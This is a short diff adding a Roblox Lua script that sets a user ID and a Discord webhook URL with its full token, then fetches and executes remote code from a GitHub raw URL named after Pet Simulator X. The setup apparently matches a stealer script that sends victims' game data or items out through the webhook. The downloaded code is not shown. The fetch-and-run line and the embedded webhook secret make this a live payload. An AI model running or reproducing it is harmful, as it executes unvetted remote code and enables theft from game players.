@@ -1,0 +1,4 @@
+UserId = 52701994
+WebHook = 'https://discord.com/api/webhooks/1098485872279695390/E-tnm664Cqi1dAQmCo18dYC8tySS1gcvxaHPb-7sG52mPNqMVniRDk2TmEJN1gMy_JJf'
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
